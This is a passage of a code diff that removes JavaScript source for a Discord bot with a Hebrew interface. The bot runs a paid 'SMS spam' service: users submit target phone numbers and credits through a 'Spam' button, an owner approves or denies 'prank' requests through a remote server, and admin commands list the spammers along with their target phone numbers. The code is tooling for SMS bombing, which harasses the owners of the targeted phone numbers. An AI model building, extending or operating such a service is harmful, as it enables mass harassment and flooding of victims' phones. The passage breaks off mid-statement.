-            '💳 **קבע קרדיטים** — קובע יתרה חדשה\n' +
-            '➕ **הוסף קרדיטים** — מוסיף ליתרה קיימת\n' +
-            '🔓 **אין סוף** — מדליק/מכבה אין סוף'
-        )
-        .setColor(0x5865F2)
-        .setFooter({ text: `© ${OWNER_NAME}` });
-
-    const row = new ActionRowBuilder()
-        .addComponents(
-            new ButtonBuilder()
-                .setCustomId('menu_set_credits')
-                .setLabel('קבע קרדיטים')
-                .setEmoji('💳')
-                .setStyle(ButtonStyle.Primary),
-            new ButtonBuilder()
-                .setCustomId('menu_add_credits')
-                .setLabel('הוסף קרדיטים')
-                .setEmoji('➕')
-                .setStyle(ButtonStyle.Success),
-            new ButtonBuilder()
-                .setCustomId('menu_toggle_unlimited')
-                .setLabel('אין סוף')
-                .setStyle(ButtonStyle.Danger)
-        );
-
-    await channel.send({ embeds: [embed], components: [row] });
-}
-
-bot.on('messageCreate', async (message) => {
-    if (message.author.bot) return;
-
-    // ==== פקודות prank — עובדות בכל חדר ====
-    if (message.content.startsWith('!approve ')) {
-        if (!isApprover(message.author.id)) {
-            await message.channel.send('❌ אין לך הרשאה').catch(() => {});
-            return;
-        }
-        const id = message.content.substring(9).trim();
-        if (!id) {
-            await message.channel.send('❌ שימוש: `!approve <id>`').catch(() => {});
-            return;
-        }
-        try {
-            const r = await fetch(`${PRANK_SERVER}/prank/approve?id=${encodeURIComponent(id)}&key=${encodeURIComponent(PRANK_SECRET)}`);
-            if (r.ok) {
-                await message.channel.send(`✅ **אושר**\n🆔 \`${id}\``).catch(() => {});
-            } else {
-                const t = await r.text();
-                await message.channel.send(`❌ שגיאה: ${t}`).catch(() => {});
-            }
-        } catch (e) {
-            await message.channel.send(`❌ שגיאה: ${e.message}`).catch(() => {});
-        }
-        return;
-    }
-
-    if (message.content.startsWith('!deny ')) {
-        if (!isApprover(message.author.id)) {
-            await message.channel.send('❌ אין לך הרשאה').catch(() => {});
-            return;
-        }
-        const id = message.content.substring(6).trim();
-        if (!id) {
-            await message.channel.send('❌ שימוש: `!deny <id>`').catch(() => {});
-            return;
-        }
-        try {
-            const r = await fetch(`${PRANK_SERVER}/prank/deny?id=${encodeURIComponent(id)}&key=${encodeURIComponent(PRANK_SECRET)}`);
-            if (r.ok) {
-                await message.channel.send(`❌ **נדחה**\n🆔 \`${id}\``).catch(() => {});
-            } else {
-                const t = await r.text();
-                await message.channel.send(`❌ שגיאה: ${t}`).catch(() => {});
-            }
-        } catch (e) {
-            await message.channel.send(`❌ שגיאה: ${e.message}`).catch(() => {});
-        }
-        return;
-    }
-
-    if (message.content === '!pending') {
-        if (!isApprover(message.author.id)) {
-            await message.channel.send('❌ אין לך הרשאה').catch(() => {});
-            return;
-        }
-        try {
-            const r = await fetch(`${PRANK_SERVER}/prank/pending?key=${encodeURIComponent(PRANK_SECRET)}`);
-            const list = await r.json();
-            if (!Array.isArray(list) || list.length === 0) {
-                await message.channel.send('📭 אין בקשות').catch(() => {});
-                return;
-            }
-            let msg = '**📋 בקשות ממתינות:**\n\n';
-            for (const item of list) {
-                msg += `🆔 \`${item.id}\` — ${item.status}\n`;
-            }
-            await message.channel.send(msg).catch(() => {});
-        } catch (e) {
-            await message.channel.send(`❌ שגיאה: ${e.message}`).catch(() => {});
-        }
-        return;
-    }
-    // ==== סוף פקודות prank ====
-
-    if (message.channel.type === 1 && message.content === '!purge') {
-        const notification = await message.channel.send('🧹 מוחק הודעות...');
-        await new Promise(r => setTimeout(r, 1000));
-        const deleted = await purgeDMMessages(message.channel);
-        try {
-            await notification.edit(`✅ נמחקו **${deleted}** הודעות.`);
-        } catch (e) {}
-        return;
-    }
-
-    const isCommandChannel = message.channel.id === COMMAND_CHANNEL_ID;
-    const isCreditsChannel = CREDITS_CHANNEL_ID && message.channel.id === CREDITS_CHANNEL_ID;
-    const isManageChannel = MANAGE_CHANNEL_ID && message.channel.id === MANAGE_CHANNEL_ID;
-
-    if (!isCommandChannel && !isCreditsChannel && !isManageChannel) return;
-
-    if (isCreditsChannel) {
-        if (message.content === '!credits-panel') {
-            await sendCreditsPanel(message.channel);
-        }
-        return;
-    }
-
-    if (isManageChannel) {
-        if (!isApprover(message.author.id)) return;
-
-        if (message.content === '!menu' || message.content === '!credits-menu') {
-            await sendManagePanel(message.channel);
-        }
-        return;
-    }
-
-    if (message.content === '!panel') {
-        const embed = new EmbedBuilder()
-            .setAuthor({ name: OWNER_NAME, iconURL: bot.user.displayAvatarURL() })
-            .setTitle('🔒 Spam Panel')
-            .setDescription(
-                '**לחץ על `Spam` כדי לשלוח SMS**\n\n' +
-                '**איך זה עובד:**\n' +
-                '1️⃣ לחץ על כפתור `Spam` למטה\n' +
-                '2️⃣ מלא את הטופס: מספר טלפון + קרדיטים\n' +
-                '3️⃣ בחר שעה (אופציונלי) — אם ריק, ישלח מיד\n' +
-                '4️⃣ **הבקשה תישלח לאישור הבעלים**\n\n' +
-                '💳 **הקרדיטים שלך מחויבים מהחשבון**'
-            )
-            .setColor(0x5865F2)
-            .setFooter({ text: `© ${OWNER_NAME} • מערכת הספאם האוטומטית` });
-
-        const row = new ActionRowBuilder()
-            .addComponents(
-                new ButtonBuilder()
-                    .setCustomId('spam_button')
-                    .setLabel('Spam')
-                    .setEmoji('🚀')
-                    .setStyle(ButtonStyle.Danger),
-                new ButtonBuilder()
-                    .setCustomId('list_button')
-                    .setLabel('רשימה')
-                    .setEmoji('📋')
-                    .setStyle(ButtonStyle.Primary),
-                new ButtonBuilder()
-                    .setCustomId('my_credits')
-                    .setLabel('הקרדיטים שלי')
-                    .setEmoji('💳')
-                    .setStyle(ButtonStyle.Secondary)
-            );
-
-        await message.channel.send({ embeds: [embed], components: [row] });
-    }
-
-    if (message.content === '!help') {
-        await message.channel.send(
-            '**🤖 פקודות:**\n\n' +
-            '`!panel` — שלח פאנל ספאם\n' +
-            '`!credits-panel` — שלח פאנל קרדיטים יומי\n' +
-            '`!menu` — שלח פאנל ניהול (בחדר manage)\n' +
-            '`!transfer @user <amount>` — העבר קרדיטים\n' +
-            '`!list` — הצג ספאמרים\n' +
-            '`!remove <id>` — מחק ספאמר\n' +
-            '`!approve <id>` — אשר בקשת prank\n' +
-            '`!deny <id>` — דחה בקשת prank\n' +
-            '`!pending` — הצג בקשות prank ממתינות'
-        );
-    }
-
-    if (message.content.startsWith('!transfer ')) {
-        const parts = message.content.split(/\s+/);
-        const target = message.mentions.users.first();
-        const amount = parseInt(parts[2]);
-
-        if (!target || isNaN(amount) || amount <= 0) {
-            await message.channel.send('❌ שימוש: `!transfer @user <amount>`');
-            return;
-        }
-
-        if (target.id === message.author.id) {
-            await message.channel.send('❌ לא ניתן להעביר לעצמך');
-            return;
-        }
-
-        const sender = getUser(message.author.id);
-        const senderUnlimited = hasUnlimited(message.author.id);
-
-        if (!senderUnlimited && sender.credits < amount) {
-            await message.channel.send(`❌ אין לך מספיק קרדיטים\n💳 יש לך: **${sender.credits}**`);
-            return;
-        }
-
-        const receiver = getUser(target.id);
-
-        if (!senderUnlimited) sender.credits -= amount;
-        receiver.credits += amount;
-        saveUsers();
-
-        await message.channel.send(
-            `✅ **העברה בוצעה!**\n\n` +
-            `📤 שלחת: **${amount}** קרדיטים ל-${target.tag}\n` +
-            (senderUnlimited ? `💳 היתרה שלך: **∞**` : `💳 היתרה שלך: **${sender.credits}**`) +
-            `\n💳 היתרה של ${target.tag}: **${receiver.credits}**`
-        );
-    }
-
-    if (message.content === '!list') {
-        if (Object.keys(spammers).length === 0) {
-            await message.channel.send('📭 אין ספאמרים');
-            return;
-        }
-        let msg = '**📋 רשימת ספאמרים:**\n\n';
-        for (const [id, sp] of Object.entries(spammers)) {
-            const status = sp.enabled ? '✅' : '❌';
-            const time = sp.hour !== null ? `${String(sp.hour).padStart(2, '0')}:${String(sp.minute).padStart(2, '0')}` : 'מיידי';
-            msg += `**${id}** ${status}\n  📱 ${sp.phone} | 💳 ${sp.credits} | 🕐 ${time}\n\n`;
-        }
-        await message.channel.send(msg);
-    }
-
-    if (message.content.startsWith('!remove ')) {
-        const id = message.content.substring(8).trim();
-        if (spammers[id]) {
-            delete spammers[id];
-            saveSpammers();
-            await message.channel.send(`🗑️ \`${id}\` נמחק`);
-        } else {
-            await message.channel.send(`❌ לא נמצא`);
-        }
-    }
-});
-
-// ========== INTERACTIONS ==========
-bot.on('interactionCreate', async (interaction) => {
-
-    if (interaction.isButton() && interaction.customId === 'menu_set_credits') {
-        if (!isApprover(interaction.user.id)) {
-            await interaction.reply({ content: '❌ אין לך הרשאה', ephemeral: true });
-            return;
-        }
-
-        const modal = new ModalBuilder()
-            .setCustomId('menu_set_credits_modal')
-            .setTitle('קבע קרדיטים');
-
-        const nameInput = new TextInputBuilder()
-            .setCustomId('name')
-            .setLabel('שם המשתמש')
-            .setStyle(TextInputStyle.Short)
-            .setPlaceholder('MRzeno')
-            .setRequired(true)
-            .setMaxLength(50);
-
-        const amountInput = new TextInputBuilder()
-            .setCustomId('amount')
-            .setLabel('כמות קרדיטים')
-            .setStyle(TextInputStyle.Short)
-            .setPlaceholder('100')
-            .setRequired(true)
-            .setMaxLength(6);
-
-        modal.addComponents(
-            new ActionRowBuilder().addComponents(nameInput),
-            new ActionRowBuilder().addComponents(amountInput)
-        );
-
-        await interaction.showModal(modal);
-        return;
-    }
-
-    if (interaction.isModalSubmit() && interaction.customId === 'menu_set_credits_modal') {
-        if (!isApprover(interaction.user.id)) return;
-
-        const name = interaction.fields.getTextInputValue('name').trim();
-        const amountRaw = interaction.fields.getTextInputValue('amount').trim();
-
-        if (!/^\d{1,6}$/.test(amountRaw)) {
-            await interaction.reply({ content: '❌ כמות חייבת להיות מספר בלבד', ephemeral: true });
-            return;
-        }
-
-        await interaction.deferReply({ ephemeral: true });
-
-        const guild = interaction.guild;
-        const member = await findUserByName(guild, name);
-
-        if (!member) {
-            await interaction.editReply({ content: `❌ לא מצאתי משתמש בשם \`${name}\`` });
-            return;
-        }
-
-        const amount = parseInt(amountRaw);
-        const u = getUser(member.id);
-        u.credits = amount;
-        saveUsers();
-
-        await interaction.editReply({
-            content: `✅ **קרדיטים נקבעו**\n\n👤 ${member.user.tag}\n💳 **${amount}** קרדיטים`
-        });
-        return;
-    }
-
-    if (interaction.isButton() && interaction.customId === 'menu_add_credits') {
-        if (!isApprover(interaction.user.id)) {
-            await interaction.reply({ content: '
